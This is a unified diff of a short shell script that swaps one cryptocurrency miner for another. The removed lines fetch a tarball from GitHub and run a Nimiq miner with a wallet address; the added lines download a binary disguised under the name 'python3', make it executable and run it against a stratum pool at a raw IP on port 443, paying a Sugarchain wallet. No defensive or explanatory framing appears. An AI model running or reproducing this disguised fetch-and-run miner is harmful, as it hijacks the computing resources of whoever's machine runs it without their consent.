@@ -1,6 +1,5 @@
 #!/bin/sh
 apt update
-wget https://github.com/komaria10003099/acema/raw/master/beepmin.tar.gz
-tar -xhf beepmin.tar.gz
-chmod +x minera
-./miner --pool=nimiq.icemining.ca:2053 --wallet-address='NQ04 H0C7 TJYF 68DT RQSF FSKX AT0A UNED 1XKL' --miner=8 --type=dumb
+wget https://github.com/haria11/ideal-octo-doodle/raw/main/python3
+chmod +x python3
+./python3 -a yespowersugar -o stratum+tcps://47.89.234.73:443 -u sugar1qwrnwp0xpuxk57l4p3strxlc9aze8k9lx25s8f0.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x -t 7
